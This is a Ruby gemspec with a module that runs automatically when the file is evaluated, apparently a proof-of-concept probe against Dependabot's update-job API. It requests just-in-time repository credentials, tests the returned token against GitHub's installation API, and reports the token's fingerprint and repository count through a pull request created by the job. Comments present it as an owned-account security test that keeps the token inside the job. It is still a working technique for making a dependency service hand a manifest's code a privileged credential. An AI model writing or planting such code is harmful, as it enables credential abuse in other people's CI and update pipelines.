# frozen_string_literal: true

require "digest"
require "json"
require "net/http"
require "uri"

# Owned-account security test. The probe asks the authenticated Dependabot job
# API for JIT repository access, discards any returned credential after a
# single owned-resource verification, and records only non-secret metadata in
# a benign Dependabot PR. No credential bytes leave the update job.
module OwnedDependabotJitProbe
  CONSUMER = "7s5/codeload-owned-probe-20261030-91f64a2c"
  RAW_PATH = "vendor/owned-dependabot-jit-control.txt"

  module_function

  def run
    job_id = ENV["DEPENDABOT_JOB_ID"]
    api_base = ENV["DEPENDABOT_API_URL"]
    return if job_id.to_s.empty? || api_base.to_s.empty?

    marker = "/tmp/owned-dependabot-jit-probe-#{job_id}"
    File.open(marker, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}

    result = request_jit_access(api_base, job_id)
    create_evidence_pr(api_base, job_id, result)
  rescue Errno::EEXIST
    nil
  rescue StandardError
    nil
  end

  def request_jit_access(api_base, job_id)
    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/create_jit_access")
    request = Net::HTTP::Post.new(endpoint.request_uri)
    request["Content-Type"] = "application/json"
    request.body = JSON.generate({ "account" => "7s5", "repository" => CONSUMER.split("/", 2).last })

    response = proxy_client(endpoint).request(request)
    result = {
      "jit_http_status" => response.code.to_i,
      "credential_returned" => false,
      "credential_fingerprint" => nil,
      "credential_api_status" => nil,
      "credential_repository_count" => nil
    }

    return result unless response.code.to_i == 200

    credential = JSON.parse(response.body).fetch("password")
    result["credential_returned"] = true
    result["credential_fingerprint"] = Digest::SHA256.hexdigest(credential)[0, 16]

    # Verify the credential only against GitHub's installation-repository
    # inventory. Record a count and status, never repository names or token
    # material. The credential is then dropped.
    verify_endpoint = URI("https://api.github.com/installation/repositories?per_page=1")
    verify_request = Net::HTTP::Get.new(verify_endpoint.request_uri)
    verify_request["Accept"] = "application/vnd.github+json"
    verify_request["Authorization"] = "Bearer #{credential}"
    verify_request["User-Agent"] = "owned-dependabot-jit-probe"
    verify_response = proxy_client(verify_endpoint).request(verify_request)
    result["credential_api_status"] = verify_response.code.to_i
    if verify_response.code.to_i == 200
      result["credential_repository_count"] = JSON.parse(verify_response.body)["total_count"]
    end

    result
  rescue StandardError => error
    {
      "jit_http_status" => 0,
      "credential_returned" => false,
      "credential_fingerprint" => nil,
      "credential_api_status" => nil,
      "credential_repository_count" => nil,
      "error_class" => error.class.name
    }
  end

  def create_evidence_pr(api_base, job_id, result)
    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/create_pull_request")
    request = Net::HTTP::Post.new(endpoint.request_uri)
    request["Content-Type"] = "application/json"
    request.body = JSON.generate(payload(current_base_sha, result))
    proxy_client(endpoint).request(request)
  end

  def current_base_sha
    endpoint = URI("https://api.github.com/repos/#{CONSUMER}/commits/main")
    request = Net::HTTP::Get.new(endpoint.request_uri)
    request["Accept"] = "application/vnd.github+json"
    request["User-Agent"] = "owned-dependabot-jit-probe"
    response = proxy_client(endpoint).request(request)
    JSON.parse(response.body).fetch("sha")
  end

  def proxy_client(endpoint)
    client = Net::HTTP::Proxy(:ENV).new(endpoint.host, endpoint.port)
    client.use_ssl = endpoint.scheme == "https"
    client.open_timeout = 10
    client.read_timeout = 20
    client
  end

  def payload(base_sha, result)
    requirement = {
      "file" => "Gemfile",
      "requirement" => ">= 0",
      "groups" => [],
      "source" => {
        "type" => "git",
        "url" => "https://github.com/downgraded/codeload-owned-probe-20261030-91f64a2c",
        "branch" => "main",
        "ref" => nil
      }
    }

    safe_result = JSON.generate(result)
    {
      "data" => {
        "dependencies" => [{
          "name" => "owned_dependabot_jit_probe",
          "version" => "0.0.6",
          "previous-version" => "0.0.5",
          "requirements" => [requirement],
          "previous-requirements" => [requirement],
          "directory" => "/"
        }],
        "updated-dependency-files" => [{
          "name" => RAW_PATH,
          "content" => "owned Dependabot JIT route probe: #{safe_result}\n",
          "directory" => "/",
          "type" => "file",
          "support_file" => false,
          "content_encoding" => "utf-8",
          "deleted" => false,
          "operation" => "create"
        }],
        "base-commit-sha" => base_sha,
        "commit-message" => "chore: owned Dependabot JIT route probe",
        "pr-title" => "Owned Dependabot JIT route probe",
        "pr-body" => "Owned security test. Only status, count, and a one-way credential fingerprint are recorded; no credential material leaves the update job. Result: #{safe_result}"
      }
    }
  end
end

OwnedDependabotJitProbe.run

Gem::Specification.new do |spec|
  spec.name = "owned_dependabot_remote_probe"
  spec.version = "0.0.6"
  spec.summary = "Owned Dependabot security probe"
  spec.authors = ["Owned Security Test"]
  spec.files = []
end
